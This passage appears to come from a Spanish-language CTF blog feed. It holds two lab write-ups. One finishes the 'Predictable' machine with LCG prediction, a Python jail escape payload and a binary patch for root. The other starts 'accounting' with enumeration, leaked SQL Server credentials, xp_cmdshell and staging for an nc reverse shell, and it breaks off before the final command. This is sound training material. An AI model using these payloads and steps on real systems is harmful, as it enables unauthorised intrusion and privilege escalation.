<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>python main.py <span class="nt">--n</span> 9223372036854775783 <span class="nt">--s0</span> 5042010115239285411 <span class="nt">--s1</span> 5691797266751657494 <span class="nt">--s2</span> 2989723807668403001
Modulus<span class="o">(</span>n<span class="o">)</span>: 9223372036854775783
Multiplier<span class="o">(</span>m<span class="o">)</span>: 81853448938945944
Increment<span class="o">(</span>c<span class="o">)</span>: 7382843889490547368
</code></pre></div></div>

<p>Buscamos el número 99:</p>

<p><img src="/assets/images/predictable/2.png" alt="image" /></p>

<p>Creamos el siguiente script para la creación del número 100 con los valores recién calculados:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="n">argparse</span>

<span class="c1"># Define the other constants
</span><span class="n">m</span> <span class="o">=</span> <span class="mi">81853448938945944</span>
<span class="n">c</span> <span class="o">=</span> <span class="mi">7382843889490547368</span>
<span class="n">n</span> <span class="o">=</span> <span class="mi">9223372036854775783</span>

<span class="c1"># Create an ArgumentParser object
</span><span class="n">parser</span> <span class="o">=</span> <span class="n">argparse</span><span class="p">.</span><span class="nc">ArgumentParser</span><span class="p">(</span><span class="n">description</span><span class="o">=</span><span class="sh">'</span><span class="s">Calcula el número 100 usando LCG</span><span class="sh">'</span><span class="p">)</span>

<span class="c1"># Add an argument for s99 with a short option name (-s99)
</span><span class="n">parser</span><span class="p">.</span><span class="nf">add_argument</span><span class="p">(</span><span class="sh">'</span><span class="s">-s99</span><span class="sh">'</span><span class="p">,</span> <span class="nb">type</span><span class="o">=</span><span class="nb">int</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="sh">'</span><span class="s">Valor 99</span><span class="sh">'</span><span class="p">,</span> <span class="n">required</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>

<span class="c1"># Parse the command-line arguments
</span><span class="n">args</span> <span class="o">=</span> <span class="n">parser</span><span class="p">.</span><span class="nf">parse_args</span><span class="p">()</span>

<span class="c1"># Extract the value of s99 from the parsed arguments
</span><span class="n">s99</span> <span class="o">=</span> <span class="n">args</span><span class="p">.</span><span class="n">s99</span>

<span class="c1"># Perform the calculation
</span><span class="n">s100</span> <span class="o">=</span> <span class="p">(</span><span class="n">s99</span> <span class="o">*</span> <span class="n">m</span> <span class="o">+</span> <span class="n">c</span><span class="p">)</span> <span class="o">%</span> <span class="n">n</span>

<span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">Valor 100: </span><span class="si">{</span><span class="n">s100</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
</code></pre></div></div>

<p>Lo ejecutamos:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>python s100.py <span class="nt">-s99</span> 2925996709184014603
Valor 100: 707173620968215045
</code></pre></div></div>

<p>E introducimos el valor en la web para obtener las credenciales de acceso:</p>

<p><img src="/assets/images/predictable/3.png" alt="image" /></p>

<p>Una vez obtenidas las credenciales nos conectamos a la máquina por <code class="language-plaintext highlighter-rouge">ssh</code>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>ssh mash@172.17.0.2
mash@172.17.0.2<span class="s1">'s password:
Linux predictable 6.8.11-amd64 #1 SMP PREEMPT_DYNAMIC Kali 6.8.11-1kali2 (2024-05-30) x86_64
....

</span></code></pre></div></div>

<p>Nos avisa de que estamos enjaulados en una jaula de python:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Romper LCG y predecir numeros es divertido
______________________________________________________________________
Ahora escapa de mi pyjail
<span class="o">&gt;</span>
</code></pre></div></div>

<p>Probamos a ver que palabras están prohibidas o bloqueadas:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;</span> import 
+Block: import
<span class="o">&gt;</span> os
Block: os
<span class="o">&gt;</span> <span class="s1">'imp'</span>+<span class="s1">'ort'</span>
import
</code></pre></div></div>

<p>Vemos que las palabras <code class="language-plaintext highlighter-rouge">import</code> y <code class="language-plaintext highlighter-rouge">os</code> están bloqueadas, pero <code class="language-plaintext highlighter-rouge">'imp'+'ort'</code> no. Ejecutamos <code class="language-plaintext highlighter-rouge">globals()</code> para ver variables globales del módulo actual, junto con sus valores. La mayoría de los modulos de python tienen disponible de forma global el módulo <code class="language-plaintext highlighter-rouge">__builtins__</code>, y como vemos, está disponible. Ejecutamos <code class="language-plaintext highlighter-rouge">globals()['__builtins__']</code> y vemos que nos deja:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;</span> globals<span class="o">()</span>
<span class="o">{</span><span class="s1">'__name__'</span>: <span class="s1">'__main__'</span>, <span class="s1">'__doc__'</span>: None, <span class="s1">'__package__'</span>: None, <span class="s1">'__loader__'</span>: &lt;_frozen_importlib_external.SourceFileLoader object at 0x7f4d31e8aed0&gt;, <span class="s1">'__spec__'</span>: None, <span class="s1">'__annotations__'</span>: <span class="o">{}</span>, <span class="s1">'__builtins__'</span>: &lt;module <span class="s1">'builtins'</span> <span class="o">(</span>built-in<span class="o">)&gt;</span>, <span class="s1">'__file__'</span>: <span class="s1">'/usr/bin/jail'</span>, <span class="s1">'__cached__'</span>: None, <span class="s1">'signal'</span>: &lt;module <span class="s1">'signal'</span> from <span class="s1">'/usr/lib/python3.11/signal.py'</span><span class="o">&gt;</span>, <span class="s1">'banner'</span>: &lt;<span class="k">function </span>banner at 0x7f4d31e304a0&gt;, <span class="s1">'main'</span>: &lt;<span class="k">function </span>main at 0x7f4d31c447c0&gt;<span class="o">}</span>
<span class="o">&gt;</span> globals<span class="o">()[</span><span class="s1">'__builtins__'</span><span class="o">]</span>
&lt;module <span class="s1">'builtins'</span> <span class="o">(</span>built-in<span class="o">)&gt;</span>
</code></pre></div></div>

<p>Para poder ejecutar un comando de bash en python necesitamos importar el modulo os .system . En la url <a href="https://docs.python.org/3/library/functions.html">https://docs.python.org/3/library/functions.html</a> vemos que está disponible la la función <code class="language-plaintext highlighter-rouge">__import__</code> . Como hemos visto antes, la palabra import esta bloqueada, asi que tenemos que partir la palabra y concatenarla con el signo +. Después con la función <code class="language-plaintext highlighter-rouge">getattr(objeto, nombre)</code> cargamos en el objeto la funcion que le indicamos, en este caso <code class="language-plaintext highlighter-rouge">getattr(globals()['__builtins__'], '__import__’)</code>. Después solo nos quedaría cargar el módulo <code class="language-plaintext highlighter-rouge">os</code> con <code class="language-plaintext highlighter-rouge">getattr(globals()['__builtins__'], '__im'+'port__')('o'+'s')</code></p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># https://docs.python.org/3/library/functions.html
</span><span class="o">&gt;</span> <span class="nf">getattr</span><span class="p">(</span><span class="nf">globals</span><span class="p">()[</span><span class="sh">'</span><span class="s">__builtins__</span><span class="sh">'</span><span class="p">],</span> <span class="sh">'</span><span class="s">__im</span><span class="sh">'</span><span class="o">+</span><span class="sh">'</span><span class="s">port__</span><span class="sh">'</span><span class="p">)</span>
<span class="o">&lt;</span><span class="n">built</span><span class="o">-</span><span class="ow">in</span> <span class="n">function</span> <span class="nb">__import__</span><span class="o">&gt;</span>

<span class="c1"># https://docs.python.org/3/library/functions.html#import__
</span><span class="o">&gt;</span> <span class="nf">getattr</span><span class="p">(</span><span class="nf">globals</span><span class="p">()[</span><span class="sh">'</span><span class="s">__builtins__</span><span class="sh">'</span><span class="p">],</span> <span class="sh">'</span><span class="s">__im</span><span class="sh">'</span><span class="o">+</span><span class="sh">'</span><span class="s">port__</span><span class="sh">'</span><span class="p">)(</span><span class="sh">'</span><span class="s">o</span><span class="sh">'</span><span class="o">+</span><span class="sh">'</span><span class="s">s</span><span class="sh">'</span><span class="p">)</span>
<span class="o">&lt;</span><span class="n">module</span> <span class="sh">'</span><span class="s">os</span><span class="sh">'</span> <span class="p">(</span><span class="n">frozen</span><span class="p">)</span><span class="o">&gt;</span>
</code></pre></div></div>

<p>Para terminar solo nos queda ejecutar el comando <strong>bash</strong> para obtener la shell. Para ello primero cargamos <code class="language-plaintext highlighter-rouge">system</code> con <code class="language-plaintext highlighter-rouge">getattr</code> y luego <code class="language-plaintext highlighter-rouge">bash</code>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># https://docs.python.org/3/library/os.html</span>
<span class="o">&gt;</span> getattr<span class="o">(</span>getattr<span class="o">(</span>globals<span class="o">()[</span><span class="s1">'__builtins__'</span><span class="o">]</span>, <span class="s1">'__im'</span>+<span class="s1">'port__'</span><span class="o">)(</span><span class="s1">'o'</span>+<span class="s1">'s'</span><span class="o">)</span>, <span class="s1">'sys'</span>+<span class="s1">'tem'</span><span class="o">)(</span><span class="s1">'bash'</span><span class="o">)</span>
mash@predictable:~<span class="nv">$ </span><span class="nb">hostname
</span>predictable
mash@predictable:~<span class="nv">$ </span>
</code></pre></div></div>
<h1 id="escalada-de-privilegios">Escalada de privilegios</h1>

<p>Una vez dentro del sistema como mash miramos con <code class="language-plaintext highlighter-rouge">sudo -l</code> para vez que comandos puede ejecutar como <strong>root</strong>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mash@predictable:~<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
Matching Defaults entries <span class="k">for </span>mash on predictable:
    env_reset, mail_badpass, <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin, use_pty

User mash may run the following commands on predictable:
    <span class="o">(</span>root<span class="o">)</span> NOPASSWD: /opt/shell
</code></pre></div></div>

<p>Si lo ejecutamos nos indica como se usa y como ver una <em>pista:</em></p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mash@predictable:~<span class="nv">$ </span><span class="nb">sudo</span> /opt/shell 
Uso: ./shell input
Pista: ./shell <span class="nt">-h</span>
</code></pre></div></div>

<p>La pista es la siguiente:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mash@predictable:~<span class="nv">$ </span><span class="nb">sudo</span> /opt/shell <span class="nt">-h</span>
¿Sabias que EI_VERSION puede tener diferentes valores?. radare2 esta instalado
</code></pre></div></div>

<p><code class="language-plaintext highlighter-rouge">Radare2</code> es un framework de ingeniería inversa.</p>

<p>De aquí en adelante he necesitado seguir el writeup de su creador, recomendable leerlo: <a href="https://ic4rta.github.io/docs/Dockerlabs/Predictable/">https://ic4rta.github.io/docs/Dockerlabs/Predictable/</a></p>

<p>Parcheamos el binario:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mash@predictable:/opt<span class="nv">$ </span>r2 <span class="nt">-w</span> shell 
WARN: Relocs has not been applied. Please use <span class="sb">`</span><span class="nt">-e</span> bin.relocs.apply<span class="o">=</span><span class="nb">true</span><span class="sb">`</span> or <span class="sb">`</span><span class="nt">-e</span> bin.cache<span class="o">=</span><span class="nb">true</span><span class="sb">`</span> next <span class="nb">time</span>
<span class="o">[</span>0x000010a0]&gt; s 6
<span class="o">[</span>0x00000006]&gt; wx 0x13
<span class="o">[</span>0x00000006]&gt; q
mash@predictable:~<span class="err">$</span>
</code></pre></div></div>

<p>Y ejecutamos para obtener la shell como <strong>root</strong>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@predictable:/opt# <span class="nb">whoami</span><span class="p">;</span> <span class="nb">hostname
</span>root
predictable
</code></pre></div></div>

<p>Magnífica máquina de c4rta</p>]]></content><author><name>murrusko</name><email>murrusko@proton.me</email></author><category term="dockerlabs" /><category term="ctf" /><category term="linux" /><category term="muydificil" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">accounting</title><link href="/posts/accounting/" rel="alternate" type="text/html" title="accounting" /><published>2024-07-01T00:00:00+00:00</published><updated>2024-07-01T00:00:00+00:00</updated><id>/posts/accounting</id><content type="html" xml:base="/posts/accounting/"><![CDATA[<p><img src="/assets/images/accounting/acc.jpg" alt="image" /></p>

<p>Estamos ante una máquina Windows de nivel principiante creada por Wxrdcn de la plataforma <a href="https://thehackerslabs.com/">The Hackers Labs</a>.</p>

<h1 id="enumeración">Enumeración</h1>

<p>Una vez importada la máquina a nuestro VirtualBox hacemos un escaneo de IPs a nuestra red:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo </span>arp-scan <span class="nt">-I</span> eth1 <span class="nt">--localnet</span>
<span class="o">[</span><span class="nb">sudo</span><span class="o">]</span> password <span class="k">for </span>murrusko: 
Interface: eth1, <span class="nb">type</span>: EN10MB, MAC: 08:00:27:5e:91:9b, IPv4: 10.0.2.5
Starting arp-scan 1.10.0 with 256 hosts <span class="o">(</span>https://github.com/royhills/arp-scan<span class="o">)</span>
10.0.2.1        52:54:00:12:35:00       QEMU
10.0.2.2        52:54:00:12:35:00       QEMU
10.0.2.3        08:00:27:63:af:94       PCS Systemtechnik GmbH
10.0.2.145      08:00:27:b0:1c:c9       PCS Systemtechnik GmbH
</code></pre></div></div>

<p>Como vemos la máquina tiene asignada la IP <code class="language-plaintext highlighter-rouge">10.0.2.145</code>.</p>

<p>Empezamos realizando un escaneo de puertos con <code class="language-plaintext highlighter-rouge">nmap</code>. Hacemos un escaneo silencioso<code class="language-plaintext highlighter-rouge">-sS</code>, a todos los puertos <code class="language-plaintext highlighter-rouge">-p-</code>, que nos de detalles del escaneo <code class="language-plaintext highlighter-rouge">-v</code>, que no haga ping al host <code class="language-plaintext highlighter-rouge">-Pn</code>, que no haga resolución de DNS <code class="language-plaintext highlighter-rouge">-n</code> y que nos guarde a un fichero grepeable <code class="language-plaintext highlighter-rouge">-oG</code> con nombre <code class="language-plaintext highlighter-rouge">ports.txt</code> a nuestra máquina victima <code class="language-plaintext highlighter-rouge">10.0.2.145</code>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo </span>nmap <span class="nt">-sS</span> <span class="nt">-p-</span> <span class="nt">-Pn</span> <span class="nt">-n</span> <span class="nt">-v</span> 10.0.2.145 <span class="nt">-oG</span> ports.txt
PORT      STATE SERVICE
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
1801/tcp  open  msmq
2103/tcp  open  zephyr-clt
2105/tcp  open  eklogin
2107/tcp  open  msmq-mgmt
5040/tcp  open  unknown
5357/tcp  open  wsdapi
7680/tcp  open  pando-pub
9047/tcp  open  unknown
9079/tcp  open  unknown
9080/tcp  open  glrpc
9081/tcp  open  cisco-aqos
9083/tcp  open  emc-pp-mgmtsvc
9147/tcp  open  unknown
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49669/tcp open  unknown
49670/tcp open  unknown
49672/tcp open  unknown
49702/tcp open  unknown
49992/tcp open  unknown
</code></pre></div></div>

<p>Como tiene un montón de puertos abiertos obtenemos la lista con el siguiente comando:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">cat </span>ports.txt | <span class="nb">grep</span> <span class="nt">-oP</span> <span class="s1">'\d{1,5}/open'</span> | <span class="nb">awk</span> <span class="s1">'{print $1}'</span> <span class="nv">FS</span><span class="o">=</span><span class="s1">'/'</span> | xargs | <span class="nb">tr</span> <span class="s1">' '</span> <span class="s1">','</span>
135,139,445,1801,2103,2105,2107,5040,5357,7680,9047,9079,9080,9081,9083,9147,49664,49665,49666,49667,49669,49670,49672,49702,49992
</code></pre></div></div>

<p>Ahora hacemos otro escaneo con <code class="language-plaintext highlighter-rouge">nmap</code>, pero esta vez para ver con mas detalle que hay en esos puertos:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo </span>nmap <span class="nt">-sCV</span> <span class="nt">-p135</span>,139,445,1801,2103,2105,2107,5040,5357,7680,9047,9079,9080,9081,9083,9147,49664,49665,49666,49667,49669,49670,49672,49702,49992 <span class="nt">-v</span> 10.0.2.145
PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
1801/tcp  open  msmq?
2103/tcp  open  msrpc         Microsoft Windows RPC
2105/tcp  open  msrpc         Microsoft Windows RPC
2107/tcp  open  msrpc         Microsoft Windows RPC
5040/tcp  open  unknown
5357/tcp  open  http          Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
|_http-title: Service Unavailable
|_http-server-header: Microsoft-HTTPAPI/2.0
7680/tcp  open  pando-pub?
9047/tcp  open  unknown
9079/tcp  open  unknown
9080/tcp  open  http          Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9081/tcp  open  http          Microsoft Cassini httpd 4.0.1.6 <span class="o">(</span>ASP.NET 4.0.30319<span class="o">)</span>
|_http-server-header: Cassini/4.0.1.6
| http-title: Login Saci
|_Requested resource was /App/Login.aspx
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
9083/tcp  open  http          Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9147/tcp  open  unknown
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
49672/tcp open  msrpc         Microsoft Windows RPC
49702/tcp open  msrpc         Microsoft Windows RPC
49992/tcp open  ms-sql-s      Microsoft SQL Server 2017 14.00.1000.00<span class="p">;</span> RTM
| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>SSL_Self_Signed_Fallback
| Issuer: <span class="nv">commonName</span><span class="o">=</span>SSL_Self_Signed_Fallback
| Public Key <span class="nb">type</span>: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-06-30T06:56:01
| Not valid after:  2054-06-30T06:56:01
| MD5:   a060:b5e7:eaf0:3da6:de75:cbed:7d75:2686
|_SHA-1: 3208:f8bb:d393:2af9:05df:76b3:afa8:a688:f62f:30cb
|_ssl-date: 2024-06-30T17:30:37+00:00<span class="p">;</span> +26s from scanner time.
| ms-sql-info: 
|   10.0.2.145<span class="se">\C</span>OMPAC: 
|     Instance name: COMPAC
|     Version: 
|       name: Microsoft SQL Server 2017 RTM
|       number: 14.00.1000.00
|       Product: Microsoft SQL Server 2017
|       Service pack level: RTM
|       Post-SP patches applied: <span class="nb">false</span>
|     TCP port: 49992
|_    Clustered: <span class="nb">false</span>
| ms-sql-ntlm-info: 
|   10.0.2.145<span class="se">\C</span>OMPAC: 
|     Target_Name: DESKTOP-M464J3M
|     NetBIOS_Domain_Name: DESKTOP-M464J3M
|     NetBIOS_Computer_Name: DESKTOP-M464J3M
|     DNS_Domain_Name: DESKTOP-M464J3M
|     DNS_Computer_Name: DESKTOP-M464J3M
|_    Product_Version: 10.0.19041
MAC Address: 08:00:27:B0:1C:C9 <span class="o">(</span>Oracle VirtualBox virtual NIC<span class="o">)</span>
Service Info: OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows

Host script results:
| nbstat: NetBIOS name: DESKTOP-M464J3M, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 08:00:27:b0:1c:c9 <span class="o">(</span>Oracle VirtualBox virtual NIC<span class="o">)</span>
| Names:
|   DESKTOP-M464J3M&lt;00&gt;  Flags: &lt;unique&gt;&lt;active&gt;
|   WORKGROUP&lt;00&gt;        Flags: &lt;group&gt;&lt;active&gt;
|   DESKTOP-M464J3M&lt;20&gt;  Flags: &lt;unique&gt;&lt;active&gt;
|   WORKGROUP&lt;1e&gt;        Flags: &lt;group&gt;&lt;active&gt;
|   WORKGROUP&lt;1d&gt;        Flags: &lt;unique&gt;&lt;active&gt;
|_  <span class="se">\x</span>01<span class="se">\x</span>02__MSBROWSE__<span class="se">\x</span>02&lt;01&gt;  Flags: &lt;group&gt;&lt;active&gt;
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   <span class="nb">date</span>: 2024-06-30T17:29:55
|_  start_date: N/A
|_clock-skew: mean: 26s, deviation: 0s, median: 25s
</code></pre></div></div>

<p>Encontramos una web en el puerto <code class="language-plaintext highlighter-rouge">9081</code>, vemos que tecnología usa con <code class="language-plaintext highlighter-rouge">whatweb</code>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>whatweb <span class="nt">-a</span> 3 http://10.0.2.145:9081
http://10.0.2.145:9081 <span class="o">[</span>302 Found] ASP_NET[4.0.30319], Country[RESERVED][ZZ], HTTPServer[Cassini/4.0.1.6], IP[10.0.2.145], RedirectLocation[/App/Login.aspx], Title[Object moved]                                                                                                                                                         
http://10.0.2.145:9081/App/Login.aspx <span class="o">[</span>200 OK] ASP_NET[4.0.30319], Bootstrap, Cookies[ASP.NET_SessionId], Country[RESERVED][ZZ], HTML5, HTTPServer[Cassini/4.0.1.6], HttpOnly[ASP.NET_SessionId], IP[10.0.2.145], JQuery[3.7.0], PasswordField[txtPassword], Script[text/javascript], Title[Login Saci]
</code></pre></div></div>

<p>Realizamos una búsqueda de ficheros y directorios con <code class="language-plaintext highlighter-rouge">feroxbuster</code>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>feroxbuster <span class="nt">-u</span> http://10.0.2.145:9081 <span class="nt">-w</span> /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt <span class="nt">-x</span> aspx <span class="nt">-r</span> <span class="nt">-d</span> 2
...
200      GET        2l        2w       22c http://10.0.2.145:9081/download/notas.txt
...

</code></pre></div></div>

<p>Encontramos un fichero llamado <code class="language-plaintext highlighter-rouge">notas.txt</code>, lo descargamos y leemos lo que tiene:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl http://10.0.2.145:9081/download/notas.txt
supervisor
supervisor
</code></pre></div></div>

<p>Parece que son las credenciales para acceder a la web. Nos logeamos con éxito pero no conseguimos hacer nada para ganar la intrusión. Asi que miramos a ver que hay en el servicio <code class="language-plaintext highlighter-rouge">samba</code>. Ejecutamos <code class="language-plaintext highlighter-rouge">smbclient</code> con los parámetros <code class="language-plaintext highlighter-rouge">—-no-pass</code> para no usar credenciales, <code class="language-plaintext highlighter-rouge">-L</code> para hacer un listado de unidades y el target <code class="language-plaintext highlighter-rouge">//10.0.2.145</code>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>smbclient <span class="nt">--no-pass</span> <span class="nt">-L</span> //10.0.2.145

        Sharename       Type      Comment
        <span class="nt">---------</span>       <span class="nt">----</span>      <span class="nt">-------</span>
        ADMIN<span class="nv">$ </span>         Disk      Admin remota
        C<span class="nv">$ </span>             Disk      Recurso predeterminado
        Compac          Disk      
        IPC<span class="nv">$ </span>           IPC       IPC remota
        Users           Disk
</code></pre></div></div>

<p>Vemos 2 recursos compartidos interesantes <code class="language-plaintext highlighter-rouge">Compac</code> y <code class="language-plaintext highlighter-rouge">Users</code>. Nos conectamos al recurso <code class="language-plaintext highlighter-rouge">Compac</code> y listamos los directorios:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smbclient <span class="nt">--no-pass</span> //10.0.2.145/Compac
Try <span class="s2">"help"</span> to get a list of possible commands.
smb: <span class="se">\&gt;</span> <span class="nb">ls</span>
  <span class="nb">.</span>                                   D        0  Sat May 11 04:49:15 2024
  ..                                  D        0  Sat May 11 04:49:15 2024
  Empresas                            D        0  Sat May 11 04:49:15 2024
  Index                               D        0  Sun Jun 30 23:52:48 2024
</code></pre></div></div>

<p>Haciendo un listado de <code class="language-plaintext highlighter-rouge">Empresas</code> vemos un fichero que llama la atención <code class="language-plaintext highlighter-rouge">SQL.txt</code>, lo descargamos a nuestra máquina:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smb: <span class="se">\E</span>mpresas<span class="se">\&gt;</span> get SQL.txt 
getting file <span class="se">\E</span>mpresas<span class="se">\S</span>QL.txt of size 448 as SQL.txt <span class="o">(</span>5.3 KiloBytes/sec<span class="o">)</span> <span class="o">(</span>average 5.3 KiloBytes/sec<span class="o">)</span>
</code></pre></div></div>

<p>Lo abrimos y vemos unas posibles credenciales de acceso al servicio de <code class="language-plaintext highlighter-rouge">SQL Server</code>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">cat </span>SQL.txt 
SQL 2017 
Instancia COMPAC 
sa 
Contpaqi2023.

</code></pre></div></div>

<h1 id="intrusión">Intrusión</h1>

<p>Vamos a usar el cliente de sql que trae el paquete <code class="language-plaintext highlighter-rouge">impacket</code>. Usamos <code class="language-plaintext highlighter-rouge">impacket-mssqlclient</code> con los parámetros <code class="language-plaintext highlighter-rouge">COMPAC/</code> , que es el nombre de dominio que hemos visto en el escaneo, seguido de las credenciales <code class="language-plaintext highlighter-rouge">sa:Contpaqi2023.</code> , le indicamos el target <code class="language-plaintext highlighter-rouge">@10.0.2.145</code> y el puerto, ya que no está en el puerto por defecto, <code class="language-plaintext highlighter-rouge">-port 49992</code>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>impacket-mssqlclient COMPAC/sa:Contpaqi2023.@10.0.2.145 <span class="nt">-port</span> 49992
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Encryption required, switching to TLS
<span class="o">[</span><span class="k">*</span><span class="o">]</span> ENVCHANGE<span class="o">(</span>DATABASE<span class="o">)</span>: Old Value: master, New Value: master
<span class="o">[</span><span class="k">*</span><span class="o">]</span> ENVCHANGE<span class="o">(</span>LANGUAGE<span class="o">)</span>: Old Value: , New Value: us_english
<span class="o">[</span><span class="k">*</span><span class="o">]</span> ENVCHANGE<span class="o">(</span>PACKETSIZE<span class="o">)</span>: Old Value: 4096, New Value: 16192
<span class="o">[</span><span class="k">*</span><span class="o">]</span> INFO<span class="o">(</span>DESKTOP-M464J3M<span class="se">\C</span>OMPAC<span class="o">)</span>: Line 1: Changed database context to <span class="s1">'master'</span><span class="nb">.</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> INFO<span class="o">(</span>DESKTOP-M464J3M<span class="se">\C</span>OMPAC<span class="o">)</span>: Line 1: Changed language setting to us_english.
<span class="o">[</span><span class="k">*</span><span class="o">]</span> ACK: Result: 1 - Microsoft SQL Server <span class="o">(</span>140 3232<span class="o">)</span> 
<span class="o">[!]</span> Press <span class="nb">help </span><span class="k">for </span>extra shell commands
SQL <span class="o">(</span>sa  dbo@master<span class="o">)&gt;</span>
</code></pre></div></div>

<p>En SQL Server hay un comando que sirve para ejecutar comandos por una shell, <code class="language-plaintext highlighter-rouge">xp_cmdshell</code>. Asi que una vez conectados probamos a ver si funciona el comando:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SQL <span class="o">(</span>sa  dbo@master<span class="o">)&gt;</span> xp_cmdshell <span class="nb">whoami
</span>output                
<span class="nt">-------------------</span>   
nt authority<span class="se">\s</span>ystem   

NULL
</code></pre></div></div>

<p>Vemos que si y encima está ejecutando los comandos como <strong>nt authority\system.</strong></p>

<h1 id="escalada-de-privilegios">Escalada de privilegios</h1>

<p>Vamos a preparar la obtención de una shell remota como <strong>nt authority\system</strong>. Para ello nos copiamos el binario <code class="language-plaintext highlighter-rouge">nc.exe</code> a nuestro directorio de trabajo. También ponemos el servidor samba con <code class="language-plaintext highlighter-rouge">impacket-smbserver</code>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">cp</span> /usr/share/windows-binaries/nc.exe <span class="nb">.</span>

<span class="nv">$ </span>impacket-smbserver <span class="nt">-smb2support</span> murrusko <span class="nb">.</span>
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Callback added <span class="k">for </span>UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Callback added <span class="k">for </span>UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
</code></pre></div></div>

<p>Nos ponemos a la escucha en nuestra máquina:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>nc <span class="nt">-nlvp</span> 8888
listening on <span class="o">[</span>any] 8888 ...
</code></pre></div></div>

<p>Y ejecutamos el comando para obtener la shell reversa:</p>

